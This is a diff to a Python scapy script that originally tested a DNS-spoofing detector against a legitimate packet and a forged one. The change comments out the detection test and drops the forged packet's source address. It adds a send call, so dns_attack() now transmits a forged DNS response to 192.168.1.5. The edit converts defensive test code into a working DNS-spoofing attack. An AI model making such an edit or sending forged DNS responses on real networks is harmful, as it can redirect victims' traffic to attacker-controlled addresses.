@@ -8,6 +8,7 @@ DNS = scapy.DNS
 DNSQR = scapy.DNSQR
 DNSRR = scapy.DNSRR
 raw = scapy.raw
+send = scapy.send
 
 def build_legit_dns_response():
     return (
@@ -31,7 +32,7 @@ def build_legit_dns_response():
 
 def build_fake_dns_response():
     return (
-        IP(src="185.10.10.10", dst="192.168.1.5") /
+        IP(dst="192.168.1.5") /
         UDP(sport=53, dport=49532) /
         DNS(
             id=0x1234,
@@ -44,14 +45,15 @@ def build_fake_dns_response():
 
 
 def dns_attack():
-    db = SqliteDatabase()
-    handler = DnsSpoofingHandler(db)
-    legit_pkt = build_legit_dns_response()
+    #db = SqliteDatabase()
+    #handler = DnsSpoofingHandler(db)
+    #legit_pkt = build_legit_dns_response()
+    #fake_pkt = build_fake_dns_response()
+    #print("Legit packet detected as spoofed?:", handler.detect(legit_pkt))  # Expected: False
+    #print("Fake packet detected as spoofed?:", handler.detect(fake_pkt))  # Expected: True
+
     fake_pkt = build_fake_dns_response()
-
-    print("Legit packet detected as spoofed?:", handler.detect(legit_pkt))  # Expected: False
-    print("Fake packet detected as spoofed?:", handler.detect(fake_pkt))  # Expected: True
-
+    send(fake_pkt, verbose=False)
 
 if __name__ == "__main__":
     dns_attack()
